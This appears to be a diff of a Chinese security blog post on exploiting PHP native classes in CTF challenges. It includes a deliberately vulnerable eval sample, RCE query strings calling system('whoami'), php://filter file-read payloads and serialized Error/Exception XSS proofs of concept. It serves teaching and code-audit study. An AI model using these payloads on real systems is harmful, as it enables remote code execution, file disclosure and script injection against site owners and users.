@@ -11,7 +11,7 @@
   <meta itemprop="name" content="php 原生类利用">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="919">
+  <meta itemprop="wordCount" content="902">
   <meta itemprop="keywords" content="代码审计,Php安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/27/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="php 原生类利用">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E\/27\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, php安全","wordcount":  919 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, php安全","wordcount":  902 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E\/27\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Php 原生类利用</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="919 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1000 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="902 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1000 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,38 +152,55 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
-      <ul>
-        <li></li>
-      </ul>
-    </li>
+    <li><a href="#evalecho-new-ab">eval(&ldquo;echo new $a($b);&rdquo;)</a></li>
+    <li><a href="#echo-new-ab">echo new $a($b)</a></li>
+    <li><a href="#new-ab">new $a($b)</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#error-内置类">Error 内置类</a></li>
+    <li><a href="#exception-内置类">Exception 内置类</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#error-类">Error 类</a></li>
+    <li><a href="#exception-类">Exception 类</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#soapclient-类">SoapClient 类</a></li>
+    <li><a href="#利用">利用</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#simplexmlelement">SimpleXMLElement</a></li>
   </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="heading" class="heading-element"><span>0.0.0.1  </span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="heading" class="heading-element"><span></span>
   <a href="#heading" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h5 id="关于new-ab" class="heading-element"><span>0.0.0.2  关于new $a($b)</span>
+</h1><h1 id="关于new-ab" class="heading-element"><span>关于new $a($b)</span>
   <a href="#%e5%85%b3%e4%ba%8enew-ab" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>CTF赛题中，常常会出现形如echo new $a($b)这⼀类的代码，其中$a和$b是⽤户可控的，⽽最终的利用点是在echo new $a($b)这⾥</p>
-<h6 id="evalecho-new-ab" class="heading-element"><span>0.0.0.2.1  eval(&ldquo;echo new $a($b);&rdquo;)</span>
+</h1><p>CTF赛题中，常常会出现形如echo new $a($b)这⼀类的代码，其中$a和$b是⽤户可控的，⽽最终的利用点是在echo new $a($b)这⾥</p>
+<h2 id="evalecho-new-ab" class="heading-element"><span>eval(&ldquo;echo new $a($b);&rdquo;)</span>
   <a href="#evalecho-new-ab" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>这⼀类代码是最简单的，很轻松就能RCE，样例代码如下</p>
+</h2><p>这⼀类代码是最简单的，很轻松就能RCE，样例代码如下</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">highlight_file</span>(<span style="color:#58a1dd">__FILE__</span>);
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;a&#39;</span>];
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$b</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;b&#39;</span>];
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">eval</span>(<span style="color:#a6be9d">&#34;echo new </span><span style="color:#a6be9d">$a</span><span style="color:#a6be9d">(</span><span style="color:#a6be9d">$b</span><span style="color:#a6be9d">);&#34;</span>);</span></span></code></pre></div><p>给a随便传⼀个原⽣类，给b传恶意命令即可：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">a</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">Exception</span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">b</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">system</span>(<span style="color:#a6be9d">&#39;whoami&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">a</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">SplFileObject</span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">b</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">system</span>(<span style="color:#a6be9d">&#39;whoami&#39;</span>)</span></span></code></pre></div><h6 id="echo-new-ab" class="heading-element"><span>0.0.0.2.2  echo new $a($b)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">a</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">SplFileObject</span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">b</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">system</span>(<span style="color:#a6be9d">&#39;whoami&#39;</span>)</span></span></code></pre></div><h2 id="echo-new-ab" class="heading-element"><span>echo new $a($b)</span>
   <a href="#echo-new-ab" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>这是在各⼤⽐赛中常考的，正因为常考，许多⼤师傅都在挖掘可被利⽤的原⽣类，⽐如：</p>
+</h2><p>这是在各⼤⽐赛中常考的，正因为常考，许多⼤师傅都在挖掘可被利⽤的原⽣类，⽐如：</p>
 <p>==遍历⽬录==类：</p>
 <ul>
 <li>
@@ -222,11 +239,11 @@
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">a</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">SplFileObject</span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">b</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">f1ag</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">php</span></span></span></code></pre></div><p>看到下⽅的结果，就只读了⽂件的第⼀⾏</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242216016.webp" alt="image-20230524221616805" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242216016.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242216016.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242216016.webp?size=large 2x" data-title="image-20230524221616805" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>因此需要使⽤伪协议将其读出来：</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">a</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">SplFileObject</span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">b</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">php</span><span style="color:#ff636f">://</span><span style="color:#58a1dd">filter</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">convert</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">base64</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">encode</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">resource</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">f1ag</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">php</span></span></span></code></pre></div><h6 id="new-ab" class="heading-element"><span>0.0.0.2.3  new $a($b)</span>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">a</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">SplFileObject</span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">b</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">php</span><span style="color:#ff636f">://</span><span style="color:#58a1dd">filter</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">convert</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">base64</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">encode</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">resource</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">f1ag</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">php</span></span></span></code></pre></div><h2 id="new-ab" class="heading-element"><span>new $a($b)</span>
   <a href="#new-ab" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>那么问题来了，如果没有echo呢？虽然代码会执⾏，但是我们拿不到结果，并且echo new $a($b);其实</p>
+</h2><p>那么问题来了，如果没有echo呢？虽然代码会执⾏，但是我们拿不到结果，并且echo new $a($b);其实</p>
 <p>也没有从根本上解决RCE这件事，⼤多CTF题都仅限于找⽂件名、读⽂件这⼀步。那假如说flag在环境变</p>
 <p>量中呢？⼜或者说读flag需要suid提权等操作？</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
@@ -284,15 +301,15 @@
 </ol>
 <p>过和出题⼈@M0th短暂的交流了⼀下，出题⼈表示：实际⽹站应⽤也挺多。攻击⾯这个维度还有待</p>
 <p>考证</p>
-<h5 id="使用errorexception内置类进行xss" class="heading-element"><span>0.0.0.3  使用Error/Exception内置类进行XSS</span>
+<h1 id="使用errorexception内置类进行xss" class="heading-element"><span>使用Error/Exception内置类进行XSS</span>
   <a href="#%e4%bd%bf%e7%94%a8errorexception%e5%86%85%e7%bd%ae%e7%b1%bb%e8%bf%9b%e8%a1%8cxss" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="error-内置类" class="heading-element"><span>0.0.0.3.1  Error 内置类</span>
+</h1><h2 id="error-内置类" class="heading-element"><span>Error 内置类</span>
   <a href="#error-%e5%86%85%e7%bd%ae%e7%b1%bb" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><ul>
+</h2><ul>
 <li>适用于php7版本</li>
 <li>在开启报错的情况下</li>
 </ul>
@@ -304,11 +321,11 @@
 <p>给出POC：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> <span style="color:#58a1dd">$a</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Error</span>(<span style="color:#a6be9d">&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;</span>);<span style="color:#58a1dd">$b</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$a</span>);<span style="color:#ff636f">echo</span> <span style="color:#58a1dd">urlencode</span>(<span style="color:#58a1dd">$b</span>);  <span style="color:#828b96;font-style:italic">?&gt;</span>
 </span></span><span style="display:flex;"><span>    //输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D
-</span></span></code></pre></div><h6 id="exception-内置类" class="heading-element"><span>0.0.0.3.2  Exception 内置类</span>
+</span></span></code></pre></div><h2 id="exception-内置类" class="heading-element"><span>Exception 内置类</span>
   <a href="#exception-%e5%86%85%e7%bd%ae%e7%b1%bb" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><ul>
+</h2><ul>
 <li>适用于php5、7版本</li>
 <li>开启报错的情况下</li>
 </ul>
@@ -317,16 +334,16 @@
 </span></span></code></pre></div><p>给出POC：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> <span style="color:#58a1dd">$a</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Exception</span>(<span style="color:#a6be9d">&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;</span>);<span style="color:#58a1dd">$b</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$a</span>);<span style="color:#ff636f">echo</span> <span style="color:#58a1dd">urlencode</span>(<span style="color:#58a1dd">$b</span>);  <span style="color:#828b96;font-style:italic">?&gt;</span>
 </span></span><span style="display:flex;"><span>    //输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
-</span></span></code></pre></div><h5 id="使用errorexception内置类绕过哈希比较" class="heading-element"><span>0.0.0.4  <strong>使用Error/Exception内置类绕过哈希比较</strong></span>
+</span></span></code></pre></div><h1 id="使用errorexception内置类绕过哈希比较" class="heading-element"><span><strong>使用Error/Exception内置类绕过哈希比较</strong></span>
   <a href="#%e4%bd%bf%e7%94%a8errorexception%e5%86%85%e7%bd%ae%e7%b1%bb%e7%bb%95%e8%bf%87%e5%93%88%e5%b8%8c%e6%af%94%e8%be%83" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>在上文中，我们已经认识了Error和Exception这两个PHP内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。这里我们就要详细的说一下这个两个错误类了。</p>
-<h6 id="error-类" class="heading-element"><span>0.0.0.4.1  Error 类</span>
+</h1><p>在上文中，我们已经认识了Error和Exception这两个PHP内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。这里我们就要详细的说一下这个两个错误类了。</p>
+<h2 id="error-类" class="heading-element"><span>Error 类</span>
   <a href="#error-%e7%b1%bb" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><strong>Error</strong> 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。</p>
+</h2><p><strong>Error</strong> 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。</p>
 <p><strong>类摘要：</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">Error</span> <span style="color:#ff636f">implements</span> <span style="color:#58a1dd">Throwable</span> {
 </span></span><span style="display:flex;"><span>  <span style="color:#828b96;font-style:italic">/* 属性 */</span>
@@ -365,11 +382,11 @@
 <li><code>Error::__toString</code> — error 的字符串表达</li>
